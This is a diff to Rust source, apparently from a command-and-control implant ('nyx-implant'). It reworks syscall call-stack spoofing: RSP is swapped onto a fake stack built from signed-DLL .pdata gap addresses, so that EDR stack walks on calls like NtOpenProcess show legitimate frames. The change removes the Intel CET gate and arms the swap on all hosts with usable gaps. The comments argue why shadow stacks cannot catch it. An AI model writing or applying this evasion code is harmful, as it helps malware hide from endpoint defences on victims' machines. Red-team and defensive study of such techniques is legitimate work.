@@ -2,8 +2,9 @@
 //!
 //! ## Status (P2.1a-ii): frame-chain synthesis + fake-stack staging is REAL and
 //! unit-verifiable; the syscall hot-path *hook point* is wired ([`set_gap_pool`]
-//! + [`spoof_wrap`]); the RSP swap itself is gated behind a runtime switch and
-//!   defaults OFF until target-side live debugging + the CET-aware swap seam land.
+//! + [`spoof_wrap`]); the RSP swap is armed at bootstrap whenever the gap pool
+//! is usable (`swap::decide`), and is CET-shadow-stack-safe by construction
+//! (see the CET section below) — no CET degradation anywhere on this path.
 //!
 //! ## Why this matters
 //! EDRs walk the call stack of a sensitive syscall (`NtOpenProcess`,
@@ -14,21 +15,34 @@
 //! the **return address** is implant-allocated — that second half is what stack
 //! spoofing closes.
 //!
-//! ## CET safety — runtime gate, not a repair seam
+//! ## CET safety — matched call/ret pairs, not a gate
 //!
 //! The gap/leaf-bridge technique is CET-safe **at the stack-walk detection
 //! layer**: EDR unwinders (`RtlVirtualUnwind` / `RtlLookupFunctionEntry`) treat
 //! `.pdata`-gap addresses as leaf functions (RSP += 8, no shadow-stack touch),
 //! so a chain of leaf gaps reads as a clean synthetic chain.
 //!
-//! At the `ret` **execution layer**, Intel CET shadow stacks fault (`#CP`) if
-//! the popped return address doesn't match the shadow stack. A plain
-//! `mov rsp / call / ret` swap would fault on CET-on hosts. **This module does
-//! NOT attempt a `#CP` repair seam** (no `KiControlProtectionFault` /
-//! `RtlRestoreContext` VEH). Instead, it uses a runtime `should_execute()` gate:
-//! `cet_active()` (via `IsProcessorFeaturePresent(PF_SMET_CET_SHADOW_STACKS)`)
-//! is probed at every call; when CET is detected, the swap degrades to a direct
-//! `f()` call (no spoofing). On CET-off hosts the swap runs normally.
+//! It is ALSO CET-safe **at the `ret` execution layer**, by construction:
+//! Intel CET shadow stacks fault (`#CP`) only when a `ret` pops a data-stack
+//! value that differs from the shadow-stack top. This swap enters the fake
+//! stack with a normal `call` (hardware pushes the SAME return address to
+//! both stacks) and every executed `ret` unwinds exactly those matched
+//! pushes; the forged gap sea sits ABOVE the active call region and is only
+//! READ by unwinders, never POPPED. The shadow stack therefore never
+//! diverges — there is no mismatched `ret` for CET to catch, so the swap
+//! executes unchanged on CET-on hosts. (CET's other half, IBT, is enforced
+//! by Windows only in kernel mode, so the trampoline's indirect calls need
+//! no `endbr64`.) Spoofs that WOULD #CP — anything that returns THROUGH a
+//! forged frame (classic `push fake_RA; jmp target` / ReturnStub style) —
+//! are simply not implemented here.
+//!
+//! **This module does NOT attempt a `#CP` repair seam** (no
+//! `KiControlProtectionFault` / `RtlRestoreContext` VEH), and no CET runtime
+//! gate either: `swap::should_execute` degrades only when the gap pool is
+//! unusable. The residual CET-host risk is detection, not crash: a
+//! kernel-level detector comparing data stack vs shadow stack would see the
+//! divergence — that is inherent to every user-mode spoof and is an
+//! operator tradeoff, not a soundness issue.
 //!
 //! ## Single-source-of-truth
 //! The frame-chain *math* lives ONLY in `nyx-implant-evasionsdk::frame`
@@ -52,11 +66,11 @@ const BRIDGE_DEPTH: usize = 8;
 /// Master switch for the RSP swap. When armed (true), the BYOUD-Gap leaf-bridge
 /// chain is staged at init and the swap executes on every syscall, making the
 /// caller's return address resolve to a signed-DLL .pdata gap instead of an
-/// implant address. **Auto-armed at bootstrap** on CET-off hosts with usable
-/// `.pdata` gaps. On CET-on hosts the runtime `should_execute()` gate degrades
-/// to a direct call (no spoofing). The static default is `false`, but
-/// `entry::bootstrap()` calls `set_swap_enabled(true)` when
-/// `swap::decide(cet_on, gaps_usable) == Execute`.
+/// implant address. **Auto-armed at bootstrap** on any host with usable
+/// `.pdata` gaps — CET-on hosts included (the swap never pops a forged frame,
+/// so shadow-stack enforcement cannot fault it; see the module CET section).
+/// The static default is `false`, but `entry::bootstrap()` calls
+/// `set_swap_enabled(true)` when `swap::decide(cet_on, gaps_usable) == Execute`.
 static SPOOF_SWAP_ENABLED: AtomicBool = AtomicBool::new(false);
 
 /// Enable/disable the RSP swap at runtime. Call from a selftest or operator
@@ -101,8 +115,9 @@ fn global_gap_pool() -> Option<&'static GapPool> {
     }
 }
 
-/// Get a spoof RIP from the gap pool (first gap address). Used by the Foliage
-/// APC chain to set the beacon thread's CONTEXT.RIP to a fake .pdata-gap address
+/// Get a spoof RIP from the gap pool (first gap address). No current callers —
+/// its only consumer was the Foliage APC chain (removed, commit 841ffc5),
+/// which set the beacon thread's CONTEXT.RIP to a fake .pdata-gap address
 /// during sleep — stack-walking detectors see a legitimate ntdll leaf, not the
 /// implant. Returns None if the gap pool isn't populated.
 pub fn gap_pool_rip() -> Option<u64> {
@@ -186,7 +201,7 @@ pub fn last_staged_depth() -> usize {
 
 /// Hot-path hook point the syscall wrappers call. Stages a chain from the
 /// installed global pool (if any) and — ONLY when [`swap_enabled`] is true and
-/// the runtime CET gate (`should_execute`) allows — wraps `f` in the spoofed-stack scope.
+/// the gap-usability decision (`should_execute`) allows — wraps `f` in the spoofed-stack scope.
 ///
 /// With no pool installed OR the swap disabled (the default), this is a direct
 /// call to `f` with zero staging overhead. When the pool is installed AND swap
@@ -213,8 +228,10 @@ where
 /// **P2.1a-ii current behavior**:
 /// - When swap is disabled (the default), this is a direct call to `f` — no
 ///   staging, no allocator overhead. This is the hot path on every syscall.
-/// - When swap is armed AND CET-off + gaps usable, the frame-chain synthesis +
+/// - When swap is armed AND the gap pool is usable, the frame-chain synthesis +
 ///   fake-stack staging runs, then the actual RSP swap executes around `f`.
+///   CET state does not gate this: the swap never pops a forged frame, so
+///   shadow-stack enforcement cannot fault it (module CET section).
 /// - With the swap off, `f` is called directly — byte-identical to the
 ///   pre-spoof behavior, so the beacon loop is never destabilized by an
 ///   unvalidated swap.
@@ -233,26 +250,29 @@ where
 {
     // Fast path: swap not armed — skip staging entirely and call f directly.
     // This avoids wasting allocator cycles on every syscall in the hot path
-    // when the swap is disabled (the default, and permanently off on CET-active
-    // hosts). The staging data path is still exercised via selftests that call
+    // when the swap is disabled (the default until bootstrap arms it). The
+    // staging data path is still exercised via selftests that call
     // `stage_for` directly.
     if !swap_enabled() {
         return f();
     }
-    // ---- SWAP ARMED: stage the chain, then check CET + gap usability ------
+    // ---- SWAP ARMED: stage the chain, then check gap usability ------------
     let _staged = stage_for(gaps);
-    // ---- LIVE RSP SWAP (gated + CET-aware) ---------------------------------
-    // Consult the pure CET-aware decision logic (evasionsdk::swap, 5 tests):
-    // if CET is on OR gaps unusable, the swap would #CP or be useless → degrade.
+    // ---- LIVE RSP SWAP (gated, gaps-only) ----------------------------------
+    // Consult the pure decision logic (evasionsdk::swap): unusable gaps →
+    // degrade (nothing to spoof onto). CET is probed but does NOT gate — the
+    // swap never pops a forged frame, so shadow-stack enforcement cannot #CP
+    // it (see `swap::swap_never_pops_forged_frames` + the module CET section).
     let cet_on = cet_active();
     let gaps_usable = gaps.is_usable();
     if !nyx_implant_evasionsdk::swap::should_execute(cet_on, gaps_usable) {
         return f(); // Degrade — honor the decision.
     }
-    // EXECUTE: CET off + gaps usable. Swap RSP onto the staged fake stack,
-    // call f, restore RSP. The fake stack is a static buffer (no alloc on the
-    // hot path). We store f's FnOnce in a static slot the trampoline reads,
-    // because Rust inline asm can't call closures directly.
+    // EXECUTE: gaps usable (CET state irrelevant — matched-pair invariant).
+    // Swap RSP onto the staged fake stack, call f, restore RSP. The fake stack
+    // is a static buffer (no alloc on the hot path). We store f's FnOnce in a
+    // static slot the trampoline reads, because Rust inline asm can't call
+    // closures directly.
     match &_staged {
         Some(chain) if chain.depth() > 0 => unsafe { do_rsp_swap(chain, f) },
         _ => f(), // nothing staged — degrade
@@ -276,14 +296,16 @@ fn cet_active() -> bool {
 //   4. Calling f via a stored function pointer (the trampoline).
 //   5. Restoring the real RSP after f returns.
 //
-// On CET-off hosts this is safe: the `ret` in f's epilogue pops the return
-// address we placed on the fake stack (a gap address), which the unwinder
-// treats as a leaf. On CET-on hosts, decide() returns Degrade before we get
-// here, so this path is never taken with shadow stacks active.
+// On CET-off hosts this is safe; on CET-on hosts it is equally safe: every
+// executed `ret` pops a value a real `call` just pushed (matched data+shadow
+// pair). The forged gap slots are never popped — they sit above the call
+// region and only an EDR stack-walk reads them (as leaf functions). CET's
+// shadow-stack compare therefore never sees a mismatch on this path.
 
 /// Diagnostic flag: set true when the RSP-swap data path (chain staging) ran.
 /// A selftest reads this to confirm the swap mechanics executed without panic,
-/// even though the live `mov rsp` asm is now real and gated behind CET checks.
+/// even though the live `mov rsp` asm is now real and gated behind the
+/// gap-usability decision.
 static SWAP_ATTEMPTED: AtomicBool = AtomicBool::new(false);
 
 /// Read whether the RSP-swap data path was attempted (for selftest diagnostics).
@@ -295,7 +317,9 @@ pub fn swap_was_attempted() -> bool {
 /// `f` ON THE SPOOFED STACK via a concrete trampoline, then restores RSP.
 ///
 /// # Safety
-/// Caller guarantees CET off + gaps usable. `chain` must be valid.
+/// Caller guarantees gaps usable (the swap decision already ran). CET state
+/// is irrelevant to safety here — see the module CET section. `chain` must be
+/// valid.
 #[cfg(target_arch = "x86_64")]
 #[allow(unused_assignments)]
 unsafe fn do_rsp_swap<T, F: FnOnce() -> T>(chain: &StagedChain, f: F) -> T
@@ -334,11 +358,12 @@ where
     // writes T into the caller's MaybeUninit<T>. The single-beacon-thread
     // invariant makes the statics safe (no concurrent callers).
     //
-    // CET safety (module docs layer 2): this path is only reached after
-    // `should_execute(cet_on, ...)` in with_spoofed_stack returned Execute — i.e.
-    // CET is OFF on this host. On a CET-on host the gap-chain `ret`s would #CP,
-    // but decide() already degrades before we get here. The blind `mov rsp /
-    // call / ret` is therefore safe on the guarded path.
+    // CET safety (module docs, "matched call/ret pairs"): the `call {tramp}`
+    // below pushes the SAME return address to the fake data stack and the
+    // shadow stack, and the trampoline's `ret` pops that matched pair — the
+    // forged gap sea above fake_rsp is never popped by execution. The swap is
+    // therefore shadow-stack-safe on CET-on hosts too; `swap::decide` no
+    // longer gates on CET (only on gap usability).
     let out = do_rsp_swap_stage_swap::<T, F>(&f, fake_rsp);
     do_rsp_swap_stage_restore::<T, F>(f, out)
 }
